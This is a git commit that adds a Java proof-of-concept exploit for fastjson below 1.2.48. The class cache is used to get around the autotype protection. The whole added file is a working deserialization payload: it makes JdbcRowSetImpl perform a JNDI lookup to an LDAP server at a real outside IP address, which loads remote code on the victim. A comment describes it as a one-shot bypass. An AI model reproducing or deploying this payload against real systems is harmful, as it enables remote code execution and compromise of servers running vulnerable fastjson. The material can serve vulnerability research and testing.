94f1e1a3ddc63b928195359be715c2fd2356f425
liaoxinxi <liaoxinxi@kuaishou.com>
2019-07-21 15:19:51 +0800

    add payload bypass fastjson 1.2.47 using cache, no

---
+++ src/main/java/person/Bypass1247.java
@@ -0,0 +1,17 @@
+package person;
+
+import com.alibaba.fastjson.JSON;
+
+/**
+ * @author liaoxinxi <liaoxinxi@kuaishou.com>
+ * Created on 2019-07-21
+ * 用于bypass 1.2.47，适用于低于1.2.48的版本，此poc绕过了fastjson的autotype机制，无需开启autotype，直接一招毙命
+ */
+public class Bypass1247 {
+    public static void main(String[] args){
+        String payload  = "{\"cache\":{\"@type\":\"java.lang.Class\",\"val\":\"L\u0063om.sun.rowset.JdbcRowSetImpl;\"},"
+                + "\"value\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","
+                + "\"dataSourceName\":\"ldap://118.24.152.133:1389/Exploit1\",\"autoCommit\":true}}";
+        JSON.parseObject(payload, Object.class);
+    }
+}
